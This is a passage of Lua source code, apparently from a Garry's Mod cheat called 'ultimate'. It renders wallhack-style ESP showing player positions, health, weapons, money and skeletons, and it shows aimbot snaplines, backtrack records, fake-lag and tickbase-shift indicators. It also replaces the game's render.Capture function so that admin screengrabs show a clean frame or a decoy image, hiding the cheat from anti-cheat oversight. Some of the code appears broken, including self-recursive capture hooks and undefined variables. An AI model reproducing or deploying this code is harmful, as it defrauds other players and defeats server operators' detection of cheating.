            setSkyboxTexture( newname )
            oldsky = newname
        end

        // Esp shit

        if ( !gui.IsConsoleVisible() && !gui.IsGameUIVisible() ) || ultimate.UnSafeFrame then
            local view = {
                x = 0,
                y = 0,
                w = screenWidth,
                h = screenHeight,
                dopostprocess = true,
                origin = vOrigin,
                angles = vAngle,
                fov = vFOV,
                drawhud = true,
                drawmonitors = true,
                drawviewmodel = true
            }

            render.RenderView( view )
            render.CopyTexture( nil, ultimate.renderTarget )

            cam.Start2D()
                hook.Run( "Ungrabbable2D" )
            cam.End2D()

            cam.Start3D()
                hook.Run( "Ungrabbable3D" )
            cam.End3D()

            render.SetRenderTarget( ultimate.renderTarget )

            return true
        end
    end

end

function ultimate.PreScreenGrab()
    if ultimate.UnSafeFrame then return end
	ultimate.UnSafeFrame = true

	render.Clear( 0, 0, 0, 255, true, true )
	render.RenderView( {
		origin = pLocalPlayer:EyePos(),
		angles = pLocalPlayer:EyeAngles(),
		x = 0,
		y = 0,
		w = screenWidth,
		h = screenHeight,
		dopostprocess = true,
		drawhud = true,
		drawmonitors = true,
		drawviewmodel = true
	} )

	ultimate.UnSafeFrame = false
end

ultimate.prikol = Material( "a/prikol" ):GetTexture( "$basetexture" ) //  Material( file.Read( "prikol.png", "DATA" ) )

function render.Capture( data )
    ultimate.PreScreenGrab()

    if ultimate.cfg.vars["Screengrab image"] then
        cam.Start2D()
            render.DrawTextureToScreen( ultimate.prikol )
        cam.End2D()
    end

	return render.Capture( data )
end

function _G.render.Capture( data )
    ultimate.PreScreenGrab()

    if ultimate.cfg.vars["Screengrab image"] then
        cam.Start2D()
            render.DrawTextureToScreen( ultimate.prikol )
        cam.End2D()
    end

	return render.Capture( data )
end


/*
    ESP, Chams
*/

function ultimate.IsValidPlayer(pl)
    if pl == pLocalPlayer then return false end
    if not IsValid(pl) then return false end
    if not pl:Alive() then return false end


    return true
end

local vertexMatrix = {
    Vector( -1, -1, -1 ),
	Vector( -1, -1, 1 ),
	Vector( -1, 1, -1 ),
	Vector( -1, 1, 1 ),
	Vector( 1, -1, -1 ),
	Vector( 1, -1, 1 ),
	Vector( 1, 1, -1 ),
	Vector( 1, 1, 1 )
}

function ultimate.GetEntPos( entity )
    local pos, mins, maxs = entity:GetPos(), entity:GetCollisionBounds()

	local size = ( maxs - mins ) * 0.5
	local boxCenter = pos + ( mins + maxs ) * 0.5

	local iMinX, iMinY = math.huge, math.huge
	local iMaxX, iMaxY = -math.huge, -math.huge

	for i = 1, 8 do
		local screenPos = ( boxCenter + vertexMatrix[ i ] * size ):ToScreen()

        iMinX, iMinY, iMaxX, iMaxY = math.min( iMinX, screenPos.x ), math.min( iMinY, screenPos.y ), math.max( iMaxX, screenPos.x ), math.max( iMaxY, screenPos.y )
	end

	if ( iMinX <= 0 or iMinY <= 0 or iMaxX >= screenWidth or iMaxY >= screenHeight ) then
		return false
	end

    return math.ceil( iMaxX ), math.ceil( iMaxY ), math.floor( iMinX ), math.floor( iMinY )
end

function ultimate.getTextX(v,tw,pos)
    if pos == 1 or pos == 2 then
        return tw/2
    elseif pos == 3 then
        return 0
    elseif pos == 4 then
        local f = tw
        if ultimate.cfg.vars["Health bar"] and v.Health > 0 then
            if f == 0 then
                f = f + 8
            else
                f = f + 5
            end
        end
        if ultimate.cfg.vars["Armor bar"] and v.Armor > 0 then
            if f == 0 then
                f = f + 8
            else
                f = f + 5
            end
        end
        return f
    end
end

function ultimate.getTextY(max,min,th,pos,tbpos)
    if pos == 1 then
        return min-th-th*tbpos
    elseif pos == 2 then
        return max+th*tbpos
    elseif pos == 3 then
        return min+th*tbpos - 1
    elseif pos == 4 then
        return min+th*tbpos - 1
    end
end

function ultimate.SortByDistance( f, s )
    return f[1]:GetPos():DistToSqr( EyePos() ) > s[1]:GetPos():DistToSqr( EyePos() )
end

function ultimate.GenerateArrowPoss(x, y, scale, ang)
    local ang1 = Angle(0, ang, 0):Forward() * scale
    local ang2 = Angle(0, ang + 120, 0):Forward() * (scale - 1)
    local ang3 = Angle(0, ang - 120, 0):Forward() * (scale - 1)

    local p0 = {x = x, y = y}
    local poly = {
        {x = p0.x + ang1.x, y = p0.y + ang1.y},
        {x = p0.x + ang2.x, y = p0.y + ang2.y},
        {x = p0.x + ang3.x, y = p0.y + ang3.y},
    }
    return poly
end

function ultimate.DrawOutlinedPoly( poly )
    local last = nil
    for i = 1, #poly do
        local v = poly[ i ]
        if last then
            surface.DrawLine(last.x, last.y, v.x, v.y)
            last = v
        else
            last = v
        end
    end
    surface.DrawLine(last.x, last.y, poly[1].x, poly[1].y)
end

ultimate.Fonts = {
    [1] = "veranda",
    [2] = "veranda_s",
}


ultimate.BarPadding = 0

function ultimate.DrawBar(MaxX, MaxY, MinX, MinY, Pos, Current, Max, BarColor, BackColor, Gradient, GradientColor)
    if ultimate.BarPadding == 0 then
        ultimate.BarPadding = 6
    else
        ultimate.BarPadding = 11
    end

    local BarX, BarY = MinX-ultimate.BarPadding, MinY-1
    local BarW, BarH = math.floor( MaxX - MinX ), 4
    local FillW, FillH = math.ceil(Current / Max * BarW), BarH

    if Pos > 2 then
        BarW, BarH = 4, math.floor( MaxY - MinY ) + 2
        FillW, FillH = BarW, math.ceil(Current / Max * BarH)
    end

    FillW = math.min(FillW, BarW)
    FillH = math.min(FillH, BarH)

    surface.SetDrawColor(BackColor)
    surface.DrawRect(BarX, BarY, BarW, BarH)

    BarX, BarY = BarX + 1, BarY + 1

    if Pos > 2 then
        BarY = BarY + BarH - FillH
    end

    BarW, BarH = BarW - 2, BarH - 2
    FillW, FillH = FillW - 2, FillH - 2

    surface.SetDrawColor(BarColor)
    surface.DrawRect(BarX, BarY, FillW, FillH)

    if Gradient then
        surface.SetDrawColor(GradientColor)
        surface.SetMaterial(ultimate.Materials["Gradient"])
        surface.DrawTexturedRect(BarX, BarY, FillW, FillH)
    end
end

function ultimate.DrawESP()
    local d = ultimate.cfg.vars["ESP Distance"]
    local ed = ultimate.cfg.vars["Ent ESP Distance"]
    local pos = pLocalPlayer:GetPos()
    d = d * d
    ed = ed * ed

    surface.SetFont( ultimate.Fonts[ ultimate.cfg.vars["ESP Font"] ] )

    for i = 1, #ultimate.entityCache do
        local v = ultimate.entityCache[ i ]

        if not IsValid( v.entity ) then return end

        if v.position:DistToSqr( pos ) > ed then continue end

        local MaxX, MaxY, MinX, MinY = ultimate.GetEntPos( v.entity )

        if ( not MaxX ) then
            continue
        end

        local XLen, YLen = MaxX - MinX, MaxY - MinY

        surface.SetAlphaMultiplier( v.entity:IsDormant() and 0.35 or 1 )

        surface.SetTextColor( ultimate.Colors[255] )

        if ultimate.cfg.vars["Ent class"] then
            local tw, th = surface.GetTextSize( v.class )

            surface.SetTextPos( ( MaxX + (MinX - MaxX) / 2 ) - tw / 2 , MinY - th )
            surface.DrawText( v.class )
        end

        if ultimate.cfg.vars["Ent box"] then
            if ultimate.cfg.vars["Ent box style"] == 1 then
                surface.SetDrawColor(ultimate.Colors[0])
                surface.DrawOutlinedRect(MinX-1,MinY-1,XLen+2,YLen+2,3)

                surface.SetDrawColor( ultimate.Colors[255] )
                surface.DrawOutlinedRect(MinX,MinY,XLen,YLen,1)
            elseif ultimate.cfg.vars["Ent box style"] == 2 then
                local wlen, hlen = math.floor( XLen / 3 ), math.floor( YLen / 3 )

                surface.SetDrawColor(ultimate.Colors[0])

                // Left up
                surface.DrawRect( MinX - 1, MinY - 1, wlen, 3 )
                surface.DrawRect( MinX - 1, MinY - 1, 3, hlen )

                // Right up
                surface.DrawRect( MaxX - wlen + 2, MinY - 1, wlen, 3 )
                surface.DrawRect( MaxX - 1, MinY - 1, 3, hlen )

                // Left down
                surface.DrawRect( MinX - 1, MaxY - 2, wlen, 3 )
                surface.DrawRect( MinX - 1, MaxY - hlen, 3, hlen )

                // Right down
                surface.DrawRect( MaxX - wlen + 2, MaxY - 2, wlen, 3 )
                surface.DrawRect( MaxX - 1, MaxY - hlen, 3, hlen )

                surface.SetDrawColor( ultimate.Colors[255] )

                wlen = wlen - 2
                hlen = hlen - 2

                // Left up
                surface.DrawRect( MinX, MinY, wlen, 1 )
                surface.DrawRect( MinX, MinY, 1, hlen )

                // Right up
                surface.DrawRect( MaxX - wlen + 1, MinY, wlen, 1 )
                surface.DrawRect( MaxX, MinY, 1, hlen )

                // Left down
                surface.DrawRect( MinX, MaxY - 1, wlen, 1 )
                surface.DrawRect( MinX, MaxY - hlen - 1, 1, hlen )

                // Right down
                surface.DrawRect( MaxX - wlen + 1, MaxY - 1, wlen, 1 )
                surface.DrawRect( MaxX, MaxY - hlen - 1, 1, hlen )
            elseif ultimate.cfg.vars["Ent box style"] == 3 then
                cam.Start3D()
                render.DrawWireframeBox( v.position, v.entity:GetAngles(), v.entity:OBBMins(), v.entity:OBBMaxs(), ultimate.Colors[255], true )
                cam.End3D()
            end
        end
    end

    local plys = player.GetAll()

    local color_box     = string.ToColor( ultimate.cfg.colors["Box esp"] )
    local color_box_g   = string.ToColor( ultimate.cfg.colors["Box gradient"] )

    local myEyePos = pLocalPlayer:EyePos()

    for i = 1, #plys do
        local v = ultimate.playerCache[ plys[i] ]

        if not v or not ultimate.IsValidPlayer(v.entity) then continue end

        local vp = v.GetPos
        local distance = vp:DistToSqr(pos)
		if distance > d then continue end

        surface.SetAlphaMultiplier( v.entity:IsDormant() and 0.35 or 1 )

        local MaxX, MaxY, MinX, MinY = ultimate.GetEntPos( v.entity )

        if ( not MaxX ) then
            continue
        end

        local XLen, YLen = MaxX - MinX, MaxY - MinY

        local teamcolor = v.TeamColor

        if ultimate.cfg.vars["OOF Arrows"] then
            local xScale, yScale = screenWidth / 250, screenHeight / 250
            local xScale, yScale = xScale * 50, yScale * 50

            local angle = ( v.entity:EyePos() - myEyePos ):Angle()
            local addPos = Angle(0, (ultimate.SilentAngle.y - angle.y) - 90, 0):Forward()
            local pos = Vector(screenWidth / 2, screenHeight / 2, 0) + Vector(addPos.x * xScale, addPos.y * yScale, 0)

            if math.abs( math.NormalizeAngle(angle.y - ultimate.SilentAngle.y) ) >= 60 then
                local poly = ultimate.GenerateArrowPoss(pos.x, pos.y, 16, (ultimate.SilentAngle.y - angle.y) - 90)
                local poly1 = ultimate.GenerateArrowPoss(pos.x, pos.y, 17, (ultimate.SilentAngle.y - angle.y) - 90)
                local poly2 = ultimate.GenerateArrowPoss(pos.x, pos.y, 15, (ultimate.SilentAngle.y - angle.y) - 90)

                if ultimate.cfg.vars["OOF Style"] == 1 then
                    surface.SetDrawColor( ultimate.Colors[0] )
                    ultimate.DrawOutlinedPoly( poly1 )
                    ultimate.DrawOutlinedPoly( poly2 )

                    surface.SetDrawColor( teamcolor )
                    ultimate.DrawOutlinedPoly( poly )
                else
                    local ang2 = Angle(0, (ultimate.SilentAngle.y - angle.y) - 90 + 120, 0):Forward() * (scale - 1)
                    surface.SetDrawColor( teamcolor )

                    surface.DrawLine( pos.x, pos.y, pos.x, pos.y + ang2.y )
                    //surface.DrawLine(last.x, last.y, v.x, v.y)
                    //surface.DrawLine(last.x, last.y, v.x, v.y)
                    //surface.DrawLine(last.x, last.y, v.x, v.y)
                end

            end
        end

        if ultimate.cfg.vars["Box esp"] then
            if ultimate.cfg.vars["Box style"] == 1 then
                surface.SetDrawColor(ultimate.Colors[0])
                surface.DrawOutlinedRect(MinX-1,MinY-1,XLen+2,YLen+2,3)

                surface.SetDrawColor( ultimate.cfg.vars["Box team color"] and teamcolor or color_box )
                surface.DrawOutlinedRect(MinX,MinY,XLen,YLen,1)
            elseif ultimate.cfg.vars["Box style"] == 2 then
                local wlen, hlen = math.floor( XLen / 3 ), math.floor( YLen / 3 )

                surface.SetDrawColor(ultimate.Colors[0])

                // Left up
                surface.DrawRect( MinX - 1, MinY - 1, wlen, 3 )
                surface.DrawRect( MinX - 1, MinY - 1, 3, hlen )

                // Right up
                surface.DrawRect( MaxX - wlen + 2, MinY - 1, wlen, 3 )
                surface.DrawRect( MaxX - 1, MinY - 1, 3, hlen )

                // Left down
                surface.DrawRect( MinX - 1, MaxY - 2, wlen, 3 )
                surface.DrawRect( MinX - 1, MaxY - hlen, 3, hlen )

                // Right down
                surface.DrawRect( MaxX - wlen + 2, MaxY - 2, wlen, 3 )
                surface.DrawRect( MaxX - 1, MaxY - hlen, 3, hlen )

                surface.SetDrawColor( ultimate.cfg.vars["Box team color"] and teamcolor or color_box )

                wlen = wlen - 2
                hlen = hlen - 2

                // Left up
                surface.DrawRect( MinX, MinY, wlen, 1 )
                surface.DrawRect( MinX, MinY, 1, hlen )

                // Right up
                surface.DrawRect( MaxX - wlen + 1, MinY, wlen, 1 )
                surface.DrawRect( MaxX, MinY, 1, hlen )

                // Left down
                surface.DrawRect( MinX, MaxY - 1, wlen, 1 )
                surface.DrawRect( MinX, MaxY - hlen - 1, 1, hlen )

                // Right down
                surface.DrawRect( MaxX - wlen + 1, MaxY - 1, wlen, 1 )
                surface.DrawRect( MaxX, MaxY - hlen - 1, 1, hlen )
            elseif ultimate.cfg.vars["Box style"] == 3 then
                local wlen, hlen = math.floor( XLen / 3 ), math.floor( YLen / 3 )
                local xc = math.floor( XLen / 2 )

                surface.SetDrawColor(ultimate.Colors[0])

                // Left
                surface.DrawRect( MinX - 1, MinY - 1 + hlen, 3, hlen )

                surface.DrawLine( MinX - 1, MinY - 1 + hlen, MinX + xc, MinY - 1 )
                surface.DrawLine( MinX + 1, MinY - 1 + hlen, MinX + xc, MinY + 1 )

                surface.DrawLine( MinX - 1, MinY - 2 + hlen * 2, MinX + xc, MinY + 1 + YLen )
                surface.DrawLine( MinX + 1, MinY - 2 + hlen * 2, MinX + xc, MinY - 1 + YLen )

                // Right
                surface.DrawRect( MaxX - 1, MinY - 1 + hlen, 3, hlen )

                surface.DrawLine( MaxX - 1, MinY - 1 + hlen, MinX + xc, MinY + 1 )
                surface.DrawLine( MaxX + 1, MinY - 1 + hlen, MinX + xc, MinY - 1 )

                surface.DrawLine( MaxX - 1, MinY - 2 + hlen * 2, MinX + xc, MinY - 1 + YLen )
                surface.DrawLine( MaxX + 1, MinY - 2 + hlen * 2, MinX + xc, MinY + 1 + YLen )

                surface.SetDrawColor( ultimate.cfg.vars["Box team color"] and teamcolor or color_box )

                // Left
                surface.DrawRect( MinX, MinY + hlen - 1, 1, hlen )
                surface.DrawLine( MinX, MinY - 1 + hlen, MinX + xc, MinY )
                surface.DrawLine( MinX, MinY - 2 + hlen * 2, MinX + xc, MinY + YLen )

                // Right
                surface.DrawRect( MaxX, MinY + hlen - 1, 1, hlen )
                surface.DrawLine( MaxX, MinY - 1 + hlen, MinX + xc, MinY )
                surface.DrawLine( MaxX, MinY - 2 + hlen * 2, MinX + xc, MinY + YLen )
            elseif ultimate.cfg.vars["Box style"] == 4 then
                local wlen, hlen = math.floor( XLen / 3 ) + 3, math.floor( YLen / 3 ) + 3
                local x, y, xw, xh = MinX - 3, MinY - 3, MaxX + 3, MaxY + 3
                local polys = {}

                for i = 1, 3 do
                    polys = {
                        { x = x + wlen, y = y },
                        { x = xw - wlen, y = y },
                        { x = xw, y = y + hlen },
                        { x = xw, y = xh - hlen },
                        { x = xw - wlen, y = xh },
                        { x = x + wlen, y = xh },
                        { x = x, y = xh - hlen },
                        { x = x, y = y + hlen },
                    }

                    surface.SetDrawColor( i == 2 and teamcolor or ultimate.Colors[0] )
                    ultimate.DrawOutlinedPoly( polys )

                    wlen, hlen = wlen - i, hlen - i

                    y, x = y + i, x + i
                    xw, xh = xw - i, xh - i
                end
            elseif ultimate.cfg.vars["Box style"] == 5 then
                cam.Start3D()
                render.DrawWireframeBox(v.entity:GetPos(), v.entity:GetAngles(), v.entity:OBBMins(), v.entity:OBBMaxs(), ultimate.cfg.vars["Box team color"] and teamcolor or color_box, true)
                cam.End3D()
            end
        end

        // Sight lines

        if ultimate.cfg.vars["Sight lines"] then
            local tr = v.entity:GetEyeTrace()
            local startpos, hitpos = tr.StartPos:ToScreen(), tr.HitPos:ToScreen()

            surface.SetDrawColor( teamcolor )
            surface.DrawLine( startpos.x, startpos.y, hitpos.x, hitpos.y )
        end

        // text

        local ttbl = { [1] = 0, [2] = 0, [3] = 0, [4] = 0 }
        local poses = { [1] = MaxX + (MinX - MaxX) / 2, [3] = MaxX+5, [4] = MinX-5 }
        poses[2] = poses[1]

        surface.SetTextColor( ultimate.Colors[255] )

if ultimate.cfg.vars["Name"] then 
    local name = v.Name
    local pos = ultimate.cfg.vars["Name pos"]
    local tw, th = surface.GetTextSize(name)

    if ultimate.cfg.priorityList and ultimate.cfg.priorityList[v.entity:SteamID()] then
        surface.SetTextColor(255, 0, 0, 255)
    elseif ultimate.cfg.friends[v.entity:SteamID()] or v.entity:GetFriendStatus() == "friend" then
        surface.SetTextColor(0, 255, 0, 255)
    elseif ultimate.trackedPlayers and ultimate.trackedPlayers[steamId] then
        surface.SetTextColor(255, 0, 0, 255)
    else
        surface.SetTextColor(255, 255, 255, 255)
    end


    surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos), ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
    surface.DrawText(name)

    ttbl[pos] = ttbl[pos] + 0.8
end

        surface.SetTextColor( ultimate.Colors[255] )

        if ultimate.cfg.vars["Usergroup"] then
            local name = v.GetUserGroup
            local pos = ultimate.cfg.vars["Usergroup pos"]
            local tw, th = surface.GetTextSize(name)

            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8
        end


        surface.SetTextColor( ultimate.Colors[255] )

        if ultimate.cfg.vars["Weapon"] then
            local name = ultimate.cfg.vars["Show ammo"] and v.WeaponClass .. " (" .. v.WeaponAmmo .. ")" or v.WeaponClass

            if ultimate.cfg.vars["Show reloading"] then
                for i = 0, 13 do
                    if v.entity:IsValidLayer(i) then
                        if v.entity:GetSequenceActivityName(v.entity:GetLayerSequence(i)):find("RELOAD") then
                            name = "RELOADING"
                            break
                        end
                    end
                end
            end

            local pos = ultimate.cfg.vars["Weapon pos"]
            local tw, th = surface.GetTextSize(name)

            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8
        end

        if ultimate.cfg.vars["Team"] then
            local name = v.TeamName
            local pos = ultimate.cfg.vars["Team pos"]
            local tw, th = surface.GetTextSize(name)

            local teamColor = v.TeamColor or ultimate.Colors[255]
            surface.SetTextColor(teamColor)
            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8

            -- reset color so following elements (money, HP, etc.) don't inherit team tint
            surface.SetTextColor( ultimate.Colors[255] )
        end

        if ultimate.cfg.vars["DarkRP Money"] then
            local name = v.MoneyVar
            local pos = ultimate.cfg.vars["Money pos"]
            local tw, th = surface.GetTextSize(name)

            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8
        end

        ultimate.BarPadding = 0

        local health = v.Health
        local maxhealth = v.GetMaxHealth

        if health > 0 then
            if ultimate.cfg.vars["Health"] then
                local pos = ultimate.cfg.vars["Health pos"]
                local tw, th = surface.GetTextSize(health)

                surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
                surface.DrawText(health)

                ttbl[pos] = ttbl[pos] + 0.8
            end

            if ultimate.cfg.vars["Health bar"] then
                ultimate.DrawBar( MaxX, MaxY, MinX, MinY, 4, health, maxhealth, string.ToColor( ultimate.cfg.colors["Health"] ), Color(0, 0, 0), ultimate.cfg.vars["Health bar gradient"], string.ToColor( ultimate.cfg.colors["Health bar gradient"] ) )
            end
        end

        local armor = v.Armor
        local maxarmor = v.GetMaxArmor

        if armor > 0 then
            if ultimate.cfg.vars["Armor"] then
                local pos = ultimate.cfg.vars["Armor pos"]
                local tw, th = surface.GetTextSize(armor)

                surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
                surface.DrawText(armor)

                ttbl[pos] = ttbl[pos] + 0.8
            end

            if ultimate.cfg.vars["Armor bar"] then
                ultimate.DrawBar( MaxX, MaxY, MinX, MinY, 4, armor, maxarmor, string.ToColor( ultimate.cfg.colors["Armor"] ), Color(0, 0, 0), ultimate.cfg.vars["Armor bar gradient"], string.ToColor( ultimate.cfg.colors["Armor bar gradient"] ) )
            end
        end

        if ultimate.cfg.vars["Break LC"] and v.break_lc then
            local name = "Breaking LC"
            local pos = ultimate.cfg.vars["Break LC pos"]
            local tw, th = surface.GetTextSize(name)

            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8
        end

        if ultimate.cfg.vars["Simtime updated"] then
            local name = v.simtime_updated and "Updated" or "Same"
            local pos = ultimate.cfg.vars["Simtime pos"]
            local tw, th = surface.GetTextSize(name)

            surface.SetTextPos(poses[pos]-ultimate.getTextX(v,tw,pos),ultimate.getTextY(MaxY,MinY,th,pos,ttbl[pos]))
            surface.DrawText(name)

            ttbl[pos] = ttbl[pos] + 0.8
        end

        if ultimate.cfg.vars["Skeleton"] then
            surface.SetDrawColor( string.ToColor( ultimate.cfg.colors["Skeleton"] ) )

		    for i = 0, v.entity:GetBoneCount() - 1 do
                if (!v.entity:BoneHasFlag(i, BONE_USED_BY_HITBOX)) then continue end

			    local ParentId = v.entity:GetBoneParent(i)

			    if (!ParentId) then continue end

                if (!v.entity:BoneHasFlag(ParentId, BONE_USED_BY_HITBOX)) then continue end

                local BoneMatrix = v.entity:GetBoneMatrix(i)
                local ParentMatrix = v.entity:GetBoneMatrix(ParentId)

                if (!BoneMatrix or !ParentMatrix) then continue end

			    local BonePos = BoneMatrix:GetTranslation()

			    if (BonePos == v.entity:GetPos()) then continue end

			    local ParentPos = ParentMatrix:GetTranslation()

			    if (!BonePos or !ParentPos) then continue end

			    local screen1, screen2 = BonePos:ToScreen(), ParentPos:ToScreen()

			    surface.DrawLine(screen1.x, screen1.y, screen2.x, screen2.y)
		    end
        end

        if ultimate.cfg.vars["Show records"] and ultimate.canBacktrack(v) then
            local len = #ultimate.btrecords[ v ]

            for i = 1, len do
                local pos = ( ultimate.btrecords[v][i].aimpos ):ToScreen()
                surface.SetDrawColor( ultimate.backtracktick == i and ultimate.Colors["Red"] or ultimate.Colors[255] )
                surface.DrawRect(pos.x,pos.y,2,2)
            end
        end

        if ultimate.cfg.vars["Backtrack skeleton"] and ultimate.canBacktrack(v) then
            local len = #ultimate.btrecords[ v ]

            surface.SetDrawColor( ultimate.Colors[255] )

            for i = 1, len do
                local data = ultimate.btrecords[ v ][ i ].skeleton

                for nbone = 1, #data do
                    local screen1, screen2 = data[nbone][1]:ToScreen(), data[nbone][2]:ToScreen()

                    surface.DrawLine(screen1.x,screen1.y,screen2.x,screen2.y)
                end
            end
        end
    end

    surface.SetAlphaMultiplier(1)
end


surface.CreateFont("DTFont", { font = "Verdana", size = 15, antialias = false, outline = true } )
surface.CreateFont("XVIDEOS FONT", { font = "Verdana", size = 45, antialias = false, shadow = true } )

ultimate.fovColor = Color( 255, 255, 255 )
ultimate.gradFov = false






//ultimate.bgmaterial = Material( "a/paws.png", "noclamp smooth" )



do
    local lc, blc = Color(125,255,64), Color(255,64,125)

    local indx, indy = screenWidth / 2 - 100, screenHeight/2 + 250
    local charge = 0

    local gradcolor, chargedcolor, unchargedcolor = Color(200,200,200,128), Color(0,255,128), Color(255,155,0)

    local chargestate, ccharge, chargecolor = "NO CHARGE", 200, chargedcolor

    function ultimate.DrawSomeShit()
        surface.SetFont("DTFont")

        if ultimate.cfg.vars["Indicators"] then
            local latency = math.Round( ( jopa.GetLatency(0) + jopa.GetLatency(1) ) * 1000 )

            surface.SetTextColor( latency > 50 and blc or lc )
            surface.SetTextPos( 38, screenHeight - 180 )
            surface.DrawText( "VEL: " .. math.Round(pLocalPlayer:GetVelocity():Length2D()) )

            surface.SetTextColor( latency > 50 and blc or lc )
            surface.SetTextPos( 38, screenHeight - 160 )
            surface.DrawText( "AT: " .. latency .. " ms" )

            surface.SetTextColor( ultimate.SendPacket and blc or lc )
            surface.SetTextPos( 38, screenHeight - 140 )
            surface.DrawText( "FT: " .. ultimate.fakeLagTicks )

            surface.SetTextColor( pLocalPlayer.break_lc and blc or lc )
            surface.SetTextPos( 38, screenHeight - 120 )
            surface.DrawText( "LC" )
        end

        if ultimate.cfg.vars["Auto Vape"] then
            surface.SetTextColor( ultimate.tyaga == 0 and blc or lc )
            surface.SetTextPos( 38,screenHeight-220 )
            surface.DrawText( "Vape: " )

            surface.SetDrawColor( 0, 0, 0 )
            surface.DrawRect( 78, screenHeight-219, 60, 14 )

            surface.SetDrawColor( lc )
            surface.DrawRect( 79, screenHeight-218, ultimate.tyaga / ultimate.maxvape * 58, 12 )
        end

        if ultimate.cfg.vars["Tickbase shift"] and ultimate.cfg.vars["Tickbase indicator"] then
            if jopa.GetCurrentCharge() <= ultimate.cfg.vars["Shift ticks"] then
                ccharge = jopa.GetCurrentCharge() * 196 / ultimate.cfg.vars["Shift ticks"]
            end

            charge = math.Approach(charge,ccharge,FrameTime()*700)

            if jopa.GetCurrentCharge() == 0 then
                chargestate = "NO CHARGE"
                chargecolor = unchargedcolor
            elseif jopa.GetCurrentCharge() < ultimate.cfg.vars["Shift ticks"] and ultimate.IsKeyDown( ultimate.cfg.binds["Auto recharge"] ) then
                chargestate = "CHARGING"
                chargecolor = unchargedcolor
            else
                chargestate = "READY"
                chargecolor = chargedcolor
            end

            local tw, th = surface.GetTextSize(chargestate)

            surface.SetDrawColor(ultimate.Colors[12])
            surface.DrawRect(indx,indy,200,30)

            surface.SetDrawColor(chargecolor)
            surface.DrawRect(indx+2,indy+2,charge,26)

            surface.SetDrawColor( gradcolor )
            surface.SetMaterial( ultimate.Materials["Gradient right"] )
            surface.DrawTexturedRect( indx+2,indy+2,charge,26 )

            surface.SetTextColor( ultimate.Colors[245] )

            surface.SetTextPos( indx+2,indy-20 )
            surface.DrawText( "CHARGE "..jopa.GetCurrentCharge() )

            surface.SetTextPos( indx+196-tw,indy-20 )
            surface.DrawText( chargestate )
        end

        local CT = CurTime()
        local FT = FrameTime() * 128

        if ultimate.cfg.vars["Hitmarker"] and #ultimate.hitmarkers > 0 then
            local hm = string.ToColor( ultimate.cfg.colors["Hitmarker"] )

            surface.SetDrawColor( hm )

            for i = #ultimate.hitmarkers, 1, -1  do
                local v = ultimate.hitmarkers[ i ]

                if v.time < CT - 1 then table.remove( ultimate.hitmarkers, i ) continue end

                v.add = math.Approach( v.add, v.add - (CT - 1) * 5, FT )

                surface.DrawLine( ( screenWidth * 0.5 ) - v.add, ( screenHeight * 0.5 ) - v.add, ( screenWidth * 0.5 ) - 10 - v.add, ( screenHeight * 0.5 ) - 10 - v.add )
                surface.DrawLine( ( screenWidth * 0.5 ) + v.add, ( screenHeight * 0.5 ) - v.add, ( screenWidth * 0.5 ) + 10 + v.add, ( screenHeight * 0.5 ) - 10 - v.add )
                surface.DrawLine( ( screenWidth * 0.5 ) - v.add, ( screenHeight * 0.5 ) + v.add, ( screenWidth * 0.5 ) - 10 - v.add, ( screenHeight * 0.5 ) + 10 + v.add )
                surface.DrawLine( ( screenWidth * 0.5 ) + v.add, ( screenHeight * 0.5 ) + v.add, ( screenWidth * 0.5 ) + 10 + v.add, ( screenHeight * 0.5 ) + 10 + v.add )
            end
        end

        if ultimate.cfg.vars["Hitnumbers"] and #ultimate.hitnums > 0 then
            local n, c = string.ToColor( ultimate.cfg.colors["Hitnumbers"] ), string.ToColor( ultimate.cfg.colors["Hitnumbers krit"] )

            surface.SetFont( "veranda_scr" )

            for i = #ultimate.hitnums, 1, -1 do
                local v = ultimate.hitnums[ i ]

                if v.time < CT - 1 then table.remove( ultimate.hitnums, i ) continue end

                surface.SetTextColor( v.crit and c or n )

                v.add = math.Approach( v.add, v.add - (CT - 1) * 5, FT / 2 )

                surface.SetTextPos( ( screenWidth * 0.5 ) - v.add * v.xdir, ( screenHeight * 0.5 ) - v.add * v.ydir )
                surface.DrawText( v.dmg )
            end
        end

        if ultimate.cfg.vars["Fov limit"] and ultimate.cfg.vars["Show FOV"] then
            local col = string.ToColor( ultimate.cfg.colors["Show FOV"] )

            local radius = ultimate.GetFovRadius()

            surface.SetDrawColor( 0, 0, 0, 128 )
            surface.DrawCircle( ( screenWidth * 0.5 ), ( screenHeight * 0.5 ), radius + 1 )

            surface.SetDrawColor( col.r, col.g, col.b )
            surface.DrawCircle( ( screenWidth * 0.5 ), ( screenHeight * 0.5 ), radius )

            surface.SetDrawColor( 0, 0, 0, 128 )
            surface.DrawCircle( ( screenWidth * 0.5 ), ( screenHeight * 0.5 ), radius - 1 )
        end

        if ultimate.target and ultimate.targetVector then
            if ultimate.cfg.vars["Aimbot snapline"] then
                local pos = ultimate.targetVector:ToScreen()
                surface.SetDrawColor( string.ToColor( ultimate.cfg.colors["Aimbot snapline"] ) )
                surface.DrawLine( pos.x, pos.y, ( screenWidth * 0.5 ), ( screenHeight * 0.5 ) )
            end

            if ultimate.cfg.vars["Aimbot marker"] then
                local pos = ultimate.targetVector:ToScreen()
                local markerType = ultimate.cfg.vars["Aimbot marker type"] or 1
